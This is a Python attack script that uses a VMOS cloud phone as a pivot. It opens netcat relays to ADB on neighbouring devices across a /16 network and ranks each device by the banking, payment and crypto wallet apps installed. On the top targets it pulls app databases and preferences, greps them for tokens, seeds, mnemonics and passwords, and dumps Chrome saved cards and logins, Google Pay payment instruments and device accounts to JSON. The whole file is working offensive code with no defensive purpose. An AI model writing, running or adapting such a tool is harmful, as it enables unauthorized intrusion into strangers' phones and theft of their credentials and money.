#!/usr/bin/env python3
"""
Full /16 neighborhood scanner — scans all 192 discovered hosts for
fintech, wallets, crypto, payment instruments.
One-shot: reads fullscan_hosts.txt, does quick package scan, then deep extracts top targets.
"""
import asyncio
import subprocess
import os
import json
import time
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

AK = 'YOUR_VMOS_AK_HERE'
SK = 'YOUR_VMOS_SK_HERE'
PAD = 'AC32010810392'
RELAY_PORT = 15572
ADB_DEVICE = 'localhost:8550'

# High-value fintech package keywords
FINTECH_KW = [
    'pay', 'wallet', 'bank', 'cash', 'venmo', 'revolut', 'wise', 'coinbase',
    'binance', 'crypto', 'gpay', 'paypal', 'zelle', 'gcash', 'maya', 'monvel',
    'abank', 'remit', 'wemade', 'wemix', 'metamask', 'trust', 'phantom',
    'uniswap', 'opensea', 'blockchain', 'bitcoin', 'ethereum', 'token', 'defi',
    'lending', 'credit', 'loan', 'bnpl', 'finance', 'money', 'nfc',
    'samsung.pay', 'sofi', 'chime', 'robinhood', 'klarna', 'affirm', 'nubank',
    'rappi', 'yape', 'plin', 'tpaga', 'daviplata', 'nequi', 'mercado',
]

HIGH_VALUE_PKGS = {
    'com.google.android.apps.walletnfcrel': 'Google Wallet',
    'com.paypal.android.p2pmobile': 'PayPal',
    'com.venmo': 'Venmo',
    'com.squareup.cash': 'Cash App',
    'com.revolut.revolut': 'Revolut',
    'com.robinhood.android': 'Robinhood',
    'com.coinbase.android': 'Coinbase',
    'com.binance.dev': 'Binance',
    'io.metamask': 'MetaMask',
    'com.wallet.crypto.trustapp': 'Trust Wallet',
    'app.phantom': 'Phantom Wallet',
    'my.maya.android': 'Maya (PH)',
    'com.globe.gcash.android': 'GCash (PH)',
    'ua.monvel.bankalliance': 'Monvel Ukraine Bank',
    'ua.com.abank': 'A-Bank Ukraine',
    'com.wemade.wemixplay': 'WEMIX Play Crypto',
    'com.wemade.ymirglobal': 'WEMIX Ymir Global',
    'com.zellepay.zelle': 'Zelle',
    'com.chime.android': 'Chime',
    'com.sofi.mobile': 'SoFi',
    'com.klarna.android': 'Klarna',
    'com.samsung.android.spay': 'Samsung Pay',
    'com.bitpay.wallet': 'BitPay',
    'co.mona.android': 'Monzo',
    'com.starlingbank.android': 'Starling Bank',
    'com.nubank.nubank': 'Nubank',
    'com.n26.app': 'N26',
    'com.transferwise.android': 'TransferWise',
}


def adb(addr, cmd, timeout=12):
    try:
        r = subprocess.run(['adb', '-s', addr, 'shell', cmd],
                           capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except:
        return ''


async def deploy(client, target_ip, port=RELAY_PORT):
    # Step 1: kill old + mkfifo
    await client.sync_cmd(PAD,
        f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f /data/local/tmp/rf_{port}; echo c",
        timeout_sec=6)
    await asyncio.sleep(0.4)
    r2 = await client.sync_cmd(PAD,
        f"mkfifo /data/local/tmp/rf_{port} && echo fifo_ok",
        timeout_sec=6)
    d2 = r2.get('data', [])
    if not d2 or 'fifo_ok' not in str(d2[0].get('errorMsg', '')):
        return False
    await asyncio.sleep(0.3)
    # Step 3: launch
    r3 = await client.sync_cmd(PAD,
        f'nohup sh -c "nc -l -p {port} < /data/local/tmp/rf_{port} | '
        f'nc {target_ip} 5555 > /data/local/tmp/rf_{port}" > /dev/null 2>&1 & echo relay_ok',
        timeout_sec=6)
    d3 = r3.get('data', [])
    return d3 and 'relay_ok' in str(d3[0].get('errorMsg', ''))


def connect(port=RELAY_PORT):
    addr = f'localhost:{port}'
    subprocess.run(['adb', '-s', ADB_DEVICE, 'forward', f'tcp:{port}', f'tcp:{port}'],
                   capture_output=True, timeout=5)
    subprocess.run(['adb', 'connect', addr], capture_output=True, timeout=5)
    return addr


def disconnect(port=RELAY_PORT):
    subprocess.run(['adb', 'disconnect', f'localhost:{port}'], capture_output=True, timeout=5)


async def kill_relay(client, port=RELAY_PORT):
    await client.sync_cmd(PAD, f"pkill -f 'nc.*{port}' 2>/dev/null; echo d", timeout_sec=5)


def score_device(pkgs):
    """Score a device by its financial value. Higher = more interesting."""
    score = 0
    high_value = []
    fintech = []
    for pkg in pkgs:
        p = pkg.lower()
        if pkg in HIGH_VALUE_PKGS:
            score += 10
            high_value.append(pkg)
        elif any(kw in p for kw in FINTECH_KW):
            score += 3
            fintech.append(pkg)
    return score, high_value, fintech


async def quick_scan(client, ip):
    """Quick scan: just get package list + identity. Returns (score, info_dict)."""
    if not await deploy(client, ip, RELAY_PORT):
        return -1, {'ip': ip, 'error': 'relay_fail'}

    await asyncio.sleep(0.6)
    dev = connect(RELAY_PORT)
    await asyncio.sleep(0.3)

    test = adb(dev, 'echo OK', 4)
    if 'OK' not in test:
        disconnect(RELAY_PORT)
        await kill_relay(client, RELAY_PORT)
        return -1, {'ip': ip, 'error': 'adb_fail'}

    model = adb(dev, 'getprop ro.product.model', 4)
    brand = adb(dev, 'getprop ro.product.brand', 4)
    android = adb(dev, 'getprop ro.build.version.release', 4)
    raw_pkgs = adb(dev, 'pm list packages', 10)
    pkgs = [l.replace('package:', '').strip() for l in raw_pkgs.split('\n')
            if 'package:' in l]

    score, high_value, fintech = score_device(pkgs)

    # Quick account check
    accounts_raw = adb(dev, "dumpsys account 2>/dev/null | grep 'Account {' | head -10", 6)
    accounts = []
    for line in accounts_raw.split('\n'):
        if 'name=' in line:
            try:
                name = line.split('name=')[1].split(',')[0]
                atype = line.split('type=')[1].rstrip('}').strip()
                accounts.append({'name': name, 'type': atype})
            except:
                pass

    info = {
        'ip': ip,
        'brand': brand,
        'model': model,
        'android': android,
        'pkg_count': len(pkgs),
        'score': score,
        'high_value': high_value,
        'fintech': fintech,
        'accounts': accounts,
    }

    disconnect(RELAY_PORT)
    await kill_relay(client, RELAY_PORT)
    return score, info


async def deep_extract_target(client, ip, info):
    """Deep extraction of a high-value device."""
    print(f"\n  {'★'*3} DEEP EXTRACTION: {ip} ({info['brand']} {info['model']}) {'★'*3}")
    pkgs_to_scan = info['high_value'] + [p for p in info['fintech'] if p not in info['high_value']]

    if not await deploy(client, ip, RELAY_PORT):
        print(f"  [!] Relay failed for {ip}")
        return {}

    await asyncio.sleep(0.6)
    dev = connect(RELAY_PORT)
    await asyncio.sleep(0.3)

    test = adb(dev, 'echo OK', 5)
    if 'OK' not in test:
        disconnect(RELAY_PORT)
        await kill_relay(client, RELAY_PORT)
        return {}

    root_id = adb(dev, 'id', 5)
    print(f"  Shell: {root_id}")

    results = {}

    GREP_PATTERN = 'email|user|balance|token|secret|key|seed|mnemonic|private|passw|wallet|account|card|phone|session|bearer|access_token|auth'

    for pkg in pkgs_to_scan[:8]:  # limit to 8 packages per device
        pkg_label = HIGH_VALUE_PKGS.get(pkg, pkg)
        print(f"  >> {pkg_label} ({pkg})")

        outdir = os.path.join('tmp', f"scan_{ip.replace('.','_')}", pkg)
        os.makedirs(outdir, exist_ok=True)

        # Check data access
        dir_check = adb(dev, f'ls /data/data/{pkg}/ 2>/dev/null || echo NO_ACCESS', 6)
        if 'NO_ACCESS' in dir_check or not dir_check.strip():
            # try run-as
            run_as = adb(dev, f'run-as {pkg} ls 2>&1 | head -5', 6)
            if 'not debuggable' in run_as or 'Failed' in run_as:
                print(f"     Access: DENIED")
                results[pkg] = {'access': 'denied'}
                continue
            access_level = 'run-as'
        else:
            access_level = 'root'
        print(f"     Access: {access_level}")

        pkg_result = {'access': access_level}

        # Databases
        dbs_raw = adb(dev, f'ls /data/data/{pkg}/databases/ 2>/dev/null', 5)
        if dbs_raw:
            dbs = [d.strip() for d in dbs_raw.split('\n') if d.strip()
                   and not d.endswith(('-wal', '-shm', '-journal'))]
            pkg_result['databases'] = dbs
            print(f"     DBs: {', '.join(dbs[:8])}")
            for db in dbs[:6]:
                local = os.path.join(outdir, db)
                subprocess.run(
                    ['adb', '-s', dev, 'pull', f'/data/data/{pkg}/databases/{db}', local],
                    capture_output=True, timeout=20)

        # Prefs grep
        prefs_hit = adb(dev,
            f"grep -rhi '{GREP_PATTERN}' /data/data/{pkg}/shared_prefs/ 2>/dev/null | head -30", 10)
        if prefs_hit:
            pkg_result['prefs'] = prefs_hit
            print(f"     Prefs hits:\n{prefs_hit[:800]}")

        # Pull all prefs
        prefs_list = adb(dev, f'ls /data/data/{pkg}/shared_prefs/ 2>/dev/null', 5)
        if prefs_list:
            prefs_dir = os.path.join(outdir, 'prefs')
            os.makedirs(prefs_dir, exist_ok=True)
            for pf in prefs_list.split('\n'):
                pf = pf.strip()
                if pf:
                    subprocess.run(
                        ['adb', '-s', dev, 'pull',
                         f'/data/data/{pkg}/shared_prefs/{pf}',
                         os.path.join(prefs_dir, pf)],
                        capture_output=True, timeout=15)

        # Files / wallet seeds
        files_check = adb(dev,
            f"grep -rl 'seed|mnemonic|private_key|wallet' /data/data/{pkg}/files/ 2>/dev/null | head -5", 8)
        if files_check:
            pkg_result['wallet_files'] = files_check
            print(f"     WALLET FILES: {files_check}")

        # Chrome saved cards/logins
        if 'chrome' in pkg:
            cards = adb(dev,
                f"sqlite3 '/data/data/{pkg}/app_chrome/Default/Web Data' "
                f"'SELECT name_on_card,card_number_encrypted,expiration_month,expiration_year FROM credit_cards;' 2>/dev/null", 10)
            if cards:
                pkg_result['chrome_cards'] = cards
                print(f"     Chrome cards: {cards[:200]}")
            logins = adb(dev,
                f"sqlite3 '/data/data/{pkg}/app_chrome/Default/Login Data' "
                f"'SELECT origin_url,username_value FROM logins LIMIT 20;' 2>/dev/null", 10)
            if logins:
                pkg_result['chrome_logins'] = logins
                print(f"     Chrome logins:\n{logins[:400]}")

        # tapandpay
        if 'wallet' in pkg.lower() or 'gms' in pkg.lower():
            tapandpay = adb(dev,
                f"sqlite3 /data/data/{pkg}/databases/tapandpay.db "
                f"'SELECT dpan,fpan_suffix,network,status FROM payment_instruments;' 2>/dev/null", 10)
            if tapandpay:
                pkg_result['tapandpay'] = tapandpay
                print(f"     TapAndPay: {tapandpay[:200]}")

        results[pkg] = pkg_result

    # Device accounts
    accts = adb(dev, "dumpsys account 2>/dev/null | grep -E 'Account \\{|type=' | head -40", 8)
    if accts:
        results['_accounts'] = accts
        print(f"  Accounts:\n{accts[:600]}")

    # TapAndPay via GMS (global)
    tap = adb(dev,
        "sqlite3 /data/data/com.google.android.gms/databases/tapandpay.db "
        "'SELECT dpan,fpan_suffix,network,status FROM payment_instruments;' 2>/dev/null", 10)
    if tap:
        results['_tapandpay_gms'] = tap
        print(f"  GMS TapAndPay:\n{tap[:400]}")

    disconnect(RELAY_PORT)
    await kill_relay(client, RELAY_PORT)
    return results


async def main():
    client = VMOSCloudClient(ak=AK, sk=SK, base_url='https://api.vmoscloud.com')

    hosts_file = 'tmp/fullscan_hosts.txt'
    if not os.path.exists(hosts_file):
        print("[!] tmp/fullscan_hosts.txt not found. Run the full scan first.")
        return

    with open(hosts_file) as f:
        all_hosts = [h.strip() for h in f.readlines()
                     if h.strip() and h.strip() != '10.0.21.62' and '.' in h.strip()]

    # Filter out malformed IPs
    all_hosts = [h for h in all_hosts if len(h.split('.')) == 4]
    print(f"\n[*] Loaded {len(all_hosts)} hosts from fullscan")
    print(f"[*] Starting batch quick-scan to identify high-value targets...\n")

    scored = []
    failed = 0
    t0 = time.time()

    for i, ip in enumerate(all_hosts):
        elapsed = time.time() - t0
        eta = (elapsed / (i + 1)) * (len(all_hosts) - i - 1) if i > 0 else 0
        print(f"  [{i+1:3d}/{len(all_hosts)}] {ip:18s} | elapsed={elapsed:.0f}s eta={eta:.0f}s", end='', flush=True)

        score, info = await quick_scan(client, ip)

        if score < 0:
            failed += 1
            print(f" → FAIL ({info.get('error', '')})")
        else:
            hv = len(info['high_value'])
            fin = len(info['fintech'])
            acct = len(info['accounts'])
            marker = ' ★★★ HIGH VALUE' if hv > 0 else (' ★★ FINTECH' if fin > 0 else '')
            print(f" → {info['brand']} {info['model']:15s} pkgs={info['pkg_count']:3d} hv={hv} fin={fin} acct={acct}{marker}")
            if score > 0:
                scored.append((score, info))

        await asyncio.sleep(2)  # rate limit

    # Sort by score
    scored.sort(key=lambda x: x[0], reverse=True)

    print(f"\n{'='*70}")
    print(f"  QUICK SCAN COMPLETE: {len(all_hosts)} hosts | {failed} failed | {len(scored)} with fintech")
    print(f"{'='*70}")
    print(f"\n  TOP HIGH-VALUE TARGETS:")
    for rank, (score, info) in enumerate(scored[:20], 1):
        hv_names = [HIGH_VALUE_PKGS.get(p, p) for p in info['high_value']]
        print(f"  {rank:2d}. {info['ip']:18s} | {info['brand']} {info['model']:15s} | "
              f"score={score} | {', '.join(hv_names + info['fintech'])[:60]}")
        if info['accounts']:
            for a in info['accounts']:
                print(f"       Account: {a['name']} ({a['type']})")

    # Save quick scan results
    os.makedirs('tmp', exist_ok=True)
    quick_results = {
        'scan_time': time.time() - t0,
        'total_scanned': len(all_hosts),
        'failed': failed,
        'high_value_count': len(scored),
        'targets': [info for _, info in scored],
    }
    with open('tmp/full_neighborhood_scan.json', 'w') as f:
        json.dump(quick_results, f, indent=2)
    print(f"\n[✓] Quick scan saved to tmp/full_neighborhood_scan.json")

    # Deep extract top targets (score >= 10)
    top_targets = [(s, info) for s, info in scored if s >= 10][:10]
    if not top_targets:
        top_targets = scored[:5]

    if top_targets:
        print(f"\n[*] Deep extracting top {len(top_targets)} targets...")
        all_deep = {}
        for score, info in top_targets:
            deep_data = await deep_extract_target(client, info['ip'], info)
            all_deep[info['ip']] = {'quick_info': info, 'deep': deep_data}
            await asyncio.sleep(2)

        with open('tmp/deep_extraction_all_targets.json', 'w') as f:
            json.dump(all_deep, f, indent=2, default=str)
        print(f"\n[✓] Deep extraction saved to tmp/deep_extraction_all_targets.json")

    print("\n[✓] DONE")


if __name__ == '__main__':
    asyncio.run(main())
